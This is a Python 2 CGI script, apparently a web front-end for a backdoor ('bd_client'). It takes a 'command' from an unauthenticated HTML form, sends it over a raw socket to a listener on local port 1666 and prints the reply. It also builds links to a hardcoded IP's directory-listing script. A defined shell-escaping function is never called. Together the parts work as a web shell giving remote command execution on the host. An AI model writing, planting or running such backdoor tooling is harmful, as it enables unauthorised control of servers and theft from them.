#!/usr/bin/env python
# #sys.path.insert (0,"/var/www/cgi-bin")

import sys
import os
import commands
import cgi
import traceback
import string
import re
import socket

ROOTPATH="/tmp"

def page (url, result = ''):
	"""Return the main form"""
	return """<html>
		<head>
		<title>Og.</title>
		<body>
<pre>
%s
</pre>
		<hr>
		<form action="%s" method="POST">
		<input name="command" type="text" size="80">
		<input name="submit" type="submit">
		</form>
		
		</body>
		</html>
		""" % (result, url)

def bd_client (command, host='localhost', port = 1666):
	s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
	s.connect((host, port))
	s.send(command)
	data = s.recv(1024)
	s.close()
	return data

def link (matchobject):
	"""Used in re.sub calls to replace a matched object with an HTML link."""
	path = matchobject.group(0)
	l = "<a href=\"http://63.199.26.227/cgi-bin/ls.py?root=%s&path=%s\">%s</a>" % \
		(ROOTPATH+"/"+path, ROOTPATH+"/"+path, path)
	return l

def escape_shell_meta_chars(s):
         """Escape shell meta characters. This is done for security."""
         s = string.replace(s, "\\", "\\\\")
         s = string.replace(s, "`", "\\`")
         s = string.replace(s, " ", "\\ ",)
         s = string.replace(s, "&", "\\&",)
         s = string.replace(s, ";", "\\;",)
         s = string.replace(s, "\"", "\\\"",)
         s = string.replace(s, "\'", "\\'",)
         s = string.replace(s, "|", "\\|",)
         s = string.replace(s, "*", "\\*",)
         s = string.replace(s, "<", "\\<",)
         s = string.replace(s, ">", "\\>",)
         return s

sys.path.insert (0,"/var/www/cgi-bin")
sys.stderr = sys.stdout

print "Content-type: text/html"
print

try:
	form = cgi.FieldStorage()
	if form.has_key("command"):
		command = form["command"].value
		result = bd_client (command)
		print page('bd_client_web.py', result)
	else:
		print page('bd_client_web.py')

except:
	print "\n\n<pre>"
	traceback.print_exc()
	print "</pre>"


